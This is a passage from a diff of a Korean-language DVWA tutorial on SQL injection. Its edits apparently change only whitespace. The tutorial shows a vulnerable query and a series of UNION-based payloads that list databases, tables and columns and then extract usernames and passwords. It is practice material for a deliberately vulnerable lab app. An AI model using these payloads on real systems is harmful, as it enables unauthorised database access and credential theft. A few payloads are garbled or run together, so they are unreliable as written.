@@ -2,23 +2,23 @@
 이 도구를 이용하여 허용받지 않은 서비스 대상으로 해킹을 시도하는 행위는 범죄 행위 입니다.     
 해킹을 시도할 때에 발생하는 법적인 책임은 그것을 행한 사용자에게 있다는 것을 명심하시기 바랍니다.           
       
-SQL Injection 취약점은 웹 애플리케이션의 메시지를 이용하여 데이터베이스 내부의 정보를 유출하는 취약점입니다.     
-공격자는 데이터베이스 쿼리에 임의의 SQL 쿼리를 삽입함으로써 공격이 이루어 집니다.      
+SQL Injection 취약점은 웹 애플리케이션의 메시지를 이용하여 데이터베이스 내부의 정보를 유출하는 취약점입니다.         
+공격자는 데이터베이스 쿼리에 임의의 SQL 쿼리를 삽입함으로써 공격이 이루어 집니다.       
 
-![image](https://github.com/user-attachments/assets/138182d9-75ee-4b59-b146-9244a625c355)
-SQL Injection 취약점 진단의 화면 입니다. 아래 링크에서 SQL Injection 설명을 보시면 도움이 되실겁니다.
+![image](https://github.com/user-attachments/assets/138182d9-75ee-4b59-b146-9244a625c355)      
+SQL Injection 취약점 진단의 화면 입니다. 아래 링크에서 SQL Injection 설명을 보시면 도움이 되실겁니다.    
 
-![image](https://github.com/user-attachments/assets/681c8fe7-8620-4d30-a74d-e7facddab60a)
-SQL Injection에 웹 소스코드 입니다. GET 메소드로 입력한 id 값을 저장하는 것을 확인할 수 있습니다.
+![image](https://github.com/user-attachments/assets/681c8fe7-8620-4d30-a74d-e7facddab60a)    
+SQL Injection에 웹 소스코드 입니다. GET 메소드로 입력한 id 값을 저장하는 것을 확인할 수 있습니다.     
 
-![image](https://github.com/user-attachments/assets/85fdebb2-775e-44f5-834b-765623895e8d)
-Low레벨의 소스코드를 보시면 쿼리문에서 ID를 입력했을때 users 테이블에서 First name과 Surname을 검색하여 출력하는 단순한 구조로 되어 있습니다.     
+![image](https://github.com/user-attachments/assets/85fdebb2-775e-44f5-834b-765623895e8d)       
+Low레벨의 소스코드를 보시면 쿼리문에서 ID를 입력했을때 users 테이블에서 First name과 Surname을 검색하여 출력하는 단순한 구조로 되어 있습니다  .     
 여기서 문제점은 User ID를 검색하는 과정에서 입력 값 검증이 이루어 지지 않는다는 점입니다.     
 "SELECT first_name, last_name FROM users WHERE user_id = '$id';";     
 
 여기서 전체적으로 소스코드를 분석해보면 GET 메소드로 매개변수를 전달하며 ID와 Submit 2개의 매개변수가 존재하는 것을 파악할 수 있습니다.    
 
-![image](https://github.com/user-attachments/assets/2347cafe-2b9a-48e3-b18a-3b28928a2528)            
+![image](https://github.com/user-attachments/assets/2347cafe-2b9a-48e3-b18a-3b28928a2528)               
       
 User 테이블에서 User ID가 1인 first_name 필드와 last_name 필드를 출력합니다.     
 User ID 값을 1씩 증가시켜 순차적으로 전체 테이블 내의 내용을 검색해 보시기 바랍니다.     
@@ -55,27 +55,27 @@ Order by 구문은 필드 값을 정렬할때 사용하며 여기에서는 전�
         
 확인결과 해당 DB는 2개의 column을 가지고 있는것을 확인하였고, 공격 코드는 2개의 column을 포함하여 쿼리를 수행하도록 하겠습니다.     
 ' union select null, null #필드 값을 파악했으니 Union을 이용하여 데이터베이스와 버전 정보를 확인해 보도록 하겠습니다.     
-![image](https://github.com/user-attachments/assets/706b7356-a293-4edb-a350-5c985024b044)
+![image](https://github.com/user-attachments/assets/706b7356-a293-4edb-a350-5c985024b044)      
         
 ' and 1=1 union select database(), version() #' and 1=1 union select "text", @@version #User 정보 확인    
 ' union SELECT null, user() #Union select를 이용하여 중요 정보 및 파일을 출력할수 있다는것을 확인하였습니다.    
 
-![image](https://github.com/user-attachments/assets/4e06a86e-7963-4063-afac-68fe8242a8ba)
+![image](https://github.com/user-attachments/assets/4e06a86e-7963-4063-afac-68fe8242a8ba)     
 table_schema 출력' and 1=1 union SELECT "text", table_schema FROM information_schema.tables #     
 
-![image](https://github.com/user-attachments/assets/8061777a-097d-458a-b8bf-45a79682dd2c)
+![image](https://github.com/user-attachments/assets/8061777a-097d-458a-b8bf-45a79682dd2c)     
 모든 DB의 테이블명 출력, 여기서 우리가 찾고자 하는것은 'dvwa'인 테이블명 입니다.'      
 and 1=1 union SELECT table_schema, table_name FROM information_schema.tables #' and 1=1 union SELECT table_name, table_schema FROM information_schema.tables where table_schema='dvwa' #      
 
-![image](https://github.com/user-attachments/assets/0cd8e358-48a4-44bc-b62c-7de6c22c7671)
+![image](https://github.com/user-attachments/assets/0cd8e358-48a4-44bc-b62c-7de6c22c7671)    
 users 테이블에 column명을 알아보았습니다.      
 그중에 password 행을 확인하였습니다.' and =1=1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #    
 
-![image](https://github.com/user-attachments/assets/0eeab25b-2b09-42a8-8395-72c3eab1f662)
+![image](https://github.com/user-attachments/assets/0eeab25b-2b09-42a8-8395-72c3eab1f662)    
 
 아이디와 패스워드를 출력한 화면 입니다.     
 ' and 1=1 union SELECT first_name, password FROM dvwa.users #Medium 레벨, High레벨은 프록시 툴을 이용해 보시기 바랍니다.     
-![image](https://github.com/user-attachments/assets/e6d331f2-3489-4e17-82bc-4e71c1bc5c6c)
+![image](https://github.com/user-attachments/assets/e6d331f2-3489-4e17-82bc-4e71c1bc5c6c)     
 
 공격 구문 정리
 ```
